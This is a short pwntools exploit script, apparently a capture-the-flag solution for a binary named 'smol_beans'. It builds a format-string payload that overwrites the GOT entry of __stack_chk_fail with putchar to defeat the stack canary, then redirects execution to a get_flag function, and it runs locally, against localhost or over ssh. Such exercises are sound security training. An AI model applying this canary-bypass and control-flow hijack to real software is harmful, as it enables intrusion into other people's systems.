#!/usr/bin/python3

from pwn import *

context.terminal = ['konsole','-e'] # replace this with your terminal of choice
#context.log_level = 'debug'
context.binary = './build/smol_beans'

e = ELF('./build/smol_beans')
rop = ROP('./build/smol_beans')
if 'd' in sys.argv:
    p = e.debug()
elif 'r' in sys.argv:
    p = remote('localhost', 5501)
elif 's' in sys.argv:
    s = ssh(host='host', user='username', password='password')
    p = s.process('./build/smol_beans', cwd='problemDir')
else:
    p = e.process()

#payload = cyclic(112) + p64(0xdeadbeef) + b'|%19$lx'
writes = { e.got['__stack_chk_fail'] : e.sym['putchar'] }
got_payload = cyclic(112) + fmtstr_payload(20, writes) + flat({168: e.sym['get_flag']})

p.sendline(got_payload)
p.sendline(b'skip')
p.interactive()
